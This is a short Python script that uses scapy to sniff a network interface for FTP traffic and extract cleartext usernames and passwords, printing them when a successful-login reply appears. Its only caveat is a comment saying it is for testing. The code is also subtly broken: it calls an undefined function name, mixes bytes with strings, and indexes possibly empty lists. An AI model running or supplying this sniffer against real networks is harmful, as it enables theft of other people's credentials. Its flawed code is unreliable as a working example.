#!/usr/bin/env python3
# Sniff traffic for FTP, which should be deprecated, and intercept traffic
# Should only be used for testing purposes
import sys

try:
    from scapy.all import *
except ImportError:
    print("[!] The scapy module is not available.\nPlease install scapy before using.")
    sys.exit(1)

interface = sys.argv[1]
usernames = []
passwords = []

# Function to check the FTP packet for cleartext credentials
# TODO: Create and write to file instead of printing to screen
def login_check(pkt, username, password):
    try:
        if '230' in pkt[Raw].load:
            print("[+] Valid credentials found...")
            print("[+] " + str(pkt[IP].dst).strip() + "-> " + str(pkt[IP].src).strip() + ": ")
            print(f"[+] Username found: {username}")
            print(f"[+] Password found: {password}")
            return
        else:
            return
    except Exception:
        return

# Check for the presence of FTP in the packet
# This focuses on the PORT, rather than the protocol itself
# TODO: modify to be port agnostic
def check_for_ftp(pkt):
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        if pkt[TCP].dport == 21 or pkt[TCP].sport == 21:
            return True
        else:
            return False
    else:
        return False

# Function to add usernames found to a list
def check_pkt(pkt):
    if check_for_ftp(pkt):
        pass
    else:
        return
    data = pkt[Raw].load
    if "USER " in data:
        usernames.append(data.split('USER ')[1].strip())
    elif "PASS " in data:
        passwords.append(data.split("PASS ")[1].strip())
    else:
        check_login(pkt, usernames[-1], passwords[-1])

# Print status and sniff
print(f"[*] Sniffing started on {interface}.")
try:
    sniff(iface=interface, prn=check_pkt, store=0)
except Exception:
    print("[!] Failed to begin sniffing...")
    sys.exit(1)

print("[*] Sniffing stopped...")
